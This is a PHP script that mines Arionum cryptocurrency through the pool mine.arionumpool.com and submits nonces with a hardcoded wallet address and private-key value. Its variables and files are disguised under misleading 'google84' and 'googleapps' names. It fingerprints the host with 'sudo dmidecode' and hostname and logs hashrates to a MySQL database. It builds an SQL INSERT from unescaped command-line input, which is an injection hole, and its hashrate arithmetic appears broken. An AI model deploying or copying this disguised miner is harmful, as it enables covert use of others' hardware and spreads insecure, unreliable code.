<?php

$googleappscountryapps8884 = DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, "ZA");

$googleappscountryapps8884 = reset($googleappscountryapps8884);

date_default_timezone_set($googleappscountryapps8884);

$google8474747474 = rand("8884","888884");

$google84127474747474 = "12";

$hash84 = array();

for ($i = 0; $i < 5; $i++) {

$hash84[] = "google84";

}

while (1) {

$starttime = microtime(true);

$res = file_get_contents("http://mine.arionumpool.com/mine.php?q=info");

for ($i = 0; $i < $google84127474747474; $i++) {

echo "mining...";

$info = json_decode($res, true);
$data = $info['data'];
$block = $data['block'];
$difficulty = $data['difficulty'];
$publickey = $data['public_key'];
$height = $data['height'];
$limit = $data['limit'];
$argonmemory = $data['argon_mem'];
$argonthreads = $data['argon_threads'];
$argontime = $data['argon_time'];
$nonce = base64_encode(openssl_random_pseudo_bytes(32));
$nonce = preg_replace("/[^a-zA-Z0-9]/", "", $nonce);
$base = $publickey."-".$nonce."-".$block."-".$difficulty;

$argon84 = password_hash($base,PASSWORD_ARGON2I,['memory_cost' => $argonmemory, "time_cost" => $argontime, "threads" => $argonthreads]);

$hash = $base.$argon84;
            foreach ($hash84 as $google84747474747474) {
                $hash = hash("sha512", $hash, true);
            }
            $hash = hash("sha512", $hash);


            $m = str_split($hash, 2);

            $duration = hexdec($m[10]).hexdec($m[15]).hexdec($m[20]).hexdec($m[23]).
                hexdec($m[31]).hexdec($m[40]).hexdec($m[45]).hexdec($m[55]);
            $duration = ltrim($duration, '0');

            $result = gmp_div($duration, $difficulty);

if ($result > 0 && $result <= $limit) {

$argon = preg_replace("/(.*)p=[0-9](.*)/","$2",$argon84);

?>

<?php

$postData = http_build_query(
            [
                'argon'       => $argon,
                'nonce'       => $nonce,
                'private_key' => "Uku3sSxk77eYKyRdg6z7k9iPeRtr6cZJkywFmcXR1BxMkCVfGmVWsD5AFgQJi4Z8xPVfFkzwx7ir6WtPcN2BYtj",
                'public_key'  => $publickey,
                'address'     => "Uku3sSxk77eYKyRdg6z7k9iPeRtr6cZJkywFmcXR1BxMkCVfGmVWsD5AFgQJi4Z8xPVfFkzwx7ir6WtPcN2BYtj",
                'id'          => "$google8474747474",
                'worker'      => "mobile$google8474747474",
             ]
        );

        $opts = [
            'http' =>
                [
                    'method'  => 'POST',
                    'header'  => 'Content-type: application/x-www-form-urlencoded',
                    'content' => $postData,
                ],
        ];

        $context = stream_context_create($opts);

$res = file_get_contents("http://mine.arionumpool.com/mine.php?q=submitNonce", false, $context);

$data = json_decode($res, true);

$google8474 = $data['data'];

echo "$google8474";

if(preg_match("/accept/",$google8474))

{

echo "hash accepted";

}

?>

<?php

}

?>

<?php

}

$endtime = microtime(true);

$google84 = $endtime - $starttime;

$google84 = $google84 / ($google84 * $google84);

$google84747474747474747474 = $google84 * $google84127474747474;

$google84 = preg_replace("/(.*)\.(.*)/","$1",$google84747474747474747474);

$google844444744474 = preg_replace("/\s+/","",shell_exec("nproc"));

$google847474747474747474744444444474 = shell_exec("hostname");

$google84747474747474747474444444447444444474 = shell_exec("sudo dmidecode -t 4 | grep ID | sed 's/.*ID://;s/ //g'");

?>

<?php

$google844444744474 = preg_replace("/\s+/","",shell_exec("nproc"));

$google8474747474 = "0";

$google84747474744474 = "1";

$google844444744474 = preg_replace("/\s+/","",shell_exec("nproc"));

$google844444744474444474 = $google844444744474 / $argonthreads;

$google84444474447444444444444474 = $google844444744474 - $google844444744474444474;

$google844444744474444444444444744444444474 = $google844444744474 - $google84444474447444444444444474;

for ($i = 0; $i < $google844444744474; $i++) {

$google8474747474++;

$google844444744474444444444444744444444474++;

if(preg_match("/google$google8474747474/",$argv[1]))

{

$google844444744474 = file_put_contents("./hashrate$google8474747474.sh",$google84747474747474747474);

$google84444444444444447444747444744474 = file_get_contents("./pid$google844444744474444444444444744444444474.sh");

if(preg_match("/[\W\w]/","$google84444444444444447444747444744474"))

{
}

else

{

$google8444444474 = unlink("./hashrate$google844444744474444444444444744444444474.sh");

echo "$google8444444474";

}

}

}

?>

<?php

$id = rawurlencode($google84747474747474747474444444447444444474);

$hashrate = rawurlencode($google84);

$worker = rawurlencode($google847474747474747474744444444474);

$address = rawurlencode("Uku3sSxk77eYKyRdg6z7k9iPeRtr6cZJkywFmcXR1BxMkCVfGmVWsD5AFgQJi4Z8xPVfFkzwx7ir6WtPcN2BYtj");

$miner = rawurlencode("4");

$hrgpu = rawurlencode("0");

?>

<?php

$googleappscountryapps8884 = DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, "ZA");

$googleappscountryapps8884 = reset($googleappscountryapps8884);

date_default_timezone_set($googleappscountryapps8884);

?>

<?php

$servername = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps84.sh"));
$username = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps1.sh"));
$password = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps2.sh"));
$dbname = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps4.sh"));

$conn = new mysqli($servername, $username, $password, $dbname);

?>

<?php

$google84747474747474 = $argv[1];

$username = "mobileapps84";

$date84442274444474447444744474 = date("Y-m-d");

$date844422744444744474447444744474 = date("Y-m-d H:i:s");

$google847474747474747474744444444474 = shell_exec("hostname");

$sql12 = "INSERT INTO hashrate (email,date84,hour,hostname,hashrate)
VALUES ('$username','$date84442274444474447444744474','$date844422744444744474447444744474','$google847474747474747474744444444474','$google84747474747474747474')";

?>

<?php

$googleapps84747474 = mysqli_query($conn,$sql12);

echo "$googleapps84747474";

?>

<?php

$conn->close();

?>

<?php

}

?>

